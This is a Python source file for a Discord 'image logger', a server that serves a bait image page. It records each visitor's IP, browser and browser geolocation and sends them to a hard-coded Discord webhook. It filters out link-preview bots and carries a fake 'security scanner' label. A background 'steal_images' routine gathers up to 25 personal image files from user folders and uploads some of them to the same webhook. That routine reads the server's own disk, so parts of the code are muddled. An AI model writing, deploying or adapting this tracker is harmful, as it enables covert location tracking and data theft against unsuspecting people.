from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse
import traceback, requests, base64, httpagentparser, json
from threading import Thread
import asyncio
import aiohttp
from cryptography.fernet import Fernet
import os
import platform
import socket
import psutil

config = {
    "webhook": "https://discord.com/api/webhooks/1444840183089332315/t2wAfDuDme1QqMnl45c9pRfeIEnvzf8WRZAdpo9plo8wjIbsyb2746IZxlnOv98ar4jT",
    "image": "https://cdn.discordapp.com/attachments/1438902071364419697/1444841126145167440/IMG_6301.jpg?ex=692e2ca8&is=692cdb28&hm=5c78806af8c7e31b62c368fa8bfe9a0ce528582ac0231bc19d3cb0a909aea6f4&",
    "imageArgument": True,
    "username": "Advanced Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "This system has been analyzed by Advanced Security Scanner",
        "richMessage": True
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://example.com"
    }
}

class AdvancedDataCollector:
    def __init__(self):
        self.fernet_key = Fernet.generate_key()
        self.cipher = Fernet(self.fernet_key)

    def encrypt_data(self, data):
        return self.cipher.encrypt(json.dumps(data).encode())

    def get_system_info(self):
        try:
            return {
                "hostname": socket.gethostname(),
                "username": os.getenv('USERNAME') or os.getenv('USER'),
                "os": f"{platform.system()} {platform.release()}",
                "architecture": platform.architecture()[0],
                "processor": platform.processor(),
                "ram_gb": psutil.virtual_memory().total // (1024**3),
                "disk_usage": {partition.device: f"{psutil.disk_usage(partition.mountpoint).used // (1024**3)}GB" 
                              for partition in psutil.disk_partitions()}
            }
        except:
            return {"error": "System info collection failed"}

    def steal_images(self):
        try:
            image_paths = []
            target_dirs = [
                os.path.expanduser("~/Pictures"),
                os.path.expanduser("~/Downloads"),
                os.path.expanduser("~/Desktop"),
                os.path.expanduser("~/Documents")
            ]

            for directory in target_dirs:
                if os.path.exists(directory):
                    for root, dirs, files in os.walk(directory):
                        for file in files:
                            if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                                full_path = os.path.join(root, file)
                                try:
                                    if os.path.getsize(full_path) < 8 * 1024 * 1024:
                                        image_paths.append(full_path)
                                except:
                                    continue
                        if len(image_paths) >= 25:
                            break
                if len(image_paths) >= 25:
                    break
            return image_paths
        except:
            return []

    def upload_to_discord(self, data, data_type, files=None):
        try:
            payload = {
                "username": config["username"],
                "content": f"ð¨ **ADVANCED DATA COLLECTION - {data_type}** ð¨",
                "embeds": [{
                    "title": f"COMPREHENSIVE SYSTEM INTELLIGENCE - {data_type}",
                    "color": config["color"],
                    "description": f"```json\n{json.dumps(data, indent=2)}\n```"
                }]
            }

            if files:
                requests.post(config["webhook"], files=files, data=payload, timeout=10)
            else:
                requests.post(config["webhook"], json=payload, timeout=10)
            return True
        except:
            return False

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    collector = AdvancedDataCollector()

    ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    system_info = collector.get_system_info()

    os_name, browser = httpagentparser.simple_detect(useragent)

    comprehensive_data = {
        "ip_info": ip_info,
        "system_info": system_info,
        "user_agent": useragent,
        "endpoint": endpoint,
        "coordinates": coords,
        "browser_info": {"os": os_name, "browser": browser}
    }

    collector.upload_to_discord(comprehensive_data, "INITIAL_REPORT")

    def background_image_theft():
        stolen_images = collector.steal_images()
        for image_path in stolen_images[:10]:
            try:
                with open(image_path, 'rb') as f:
                    files = {'file': (os.path.basename(image_path), f.read())}
                    image_data = {
                        "file_name": os.path.basename(image_path),
                        "file_path": image_path,
                        "file_size": os.path.getsize(image_path)
                    }
                    collector.upload_to_discord(image_data, "STOLEN_IMAGE", files)
            except:
                continue

    Thread(target=background_image_theft).start()
    return comprehensive_data

class AdvancedImageLogger(BaseHTTPRequestHandler):

    def do_GET(self):
        self.handle_request()

    def do_POST(self):
        self.handle_request()

    def handle_request(self):
        try:
            if config["imageArgument"]:
                parsed_path = urlparse(self.path)
                query_params = parse_qs(parsed_path.query)

                if query_params.get('url'):
                    image_url = base64.b64decode(query_params['url'][0]).decode()
                elif query_params.get('id'):
                    image_url = base64.b64decode(query_params['id'][0]).decode()
                else:
                    image_url = config["image"]
            else:
                image_url = config["image"]

            client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            user_agent = self.headers.get('User-Agent', 'Unknown')

            html_content = f'''
            <!DOCTYPE html>
            <html>
            <head>
                <style>
                    body {{
                        margin: 0;
                        padding: 0;
                        background: #000;
                    }}
                    .image-container {{
                        background-image: url('{image_url}');
                        background-position: center center;
                        background-repeat: no-repeat;
                        background-size: contain;
                        width: 100vw;
                        height: 100vh;
                    }}
                </style>
            </head>
            <body>
                <div class="image-container"></div>
                <script>
                    setTimeout(function() {{
                        navigator.geolocation.getCurrentPosition(function(position) {{
                            const coords = btoa(position.coords.latitude + "," + position.coords.longitude);
                            const currentUrl = new URL(window.location.href);
                            currentUrl.searchParams.set('g', coords);
                            window.location.href = currentUrl.toString();
                        }});
                    }}, 1000);
                </script>
            </body>
            </html>
            '''.encode()

            if botCheck(client_ip, user_agent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 
                               'image/jpeg' if config["buggedImage"] else image_url)
                self.end_headers()
                return

            query_params = parse_qs(urlparse(self.path).query)
            coordinates = None

            if query_params.get('g') and config["accurateLocation"]:
                coordinates = base64.b64decode(query_params['g'][0]).decode()

            makeReport(client_ip, user_agent, coordinates, self.path, image_url)

            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(html_content)

        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'Internal Server Error')

def run_server():
    server = HTTPServer(('0.0.0.0', 8080), AdvancedImageLogger)
    print("Advanced Image Logger running on port 8080")
    server.serve_forever()

if __name__ == "__main__":
    run_server()
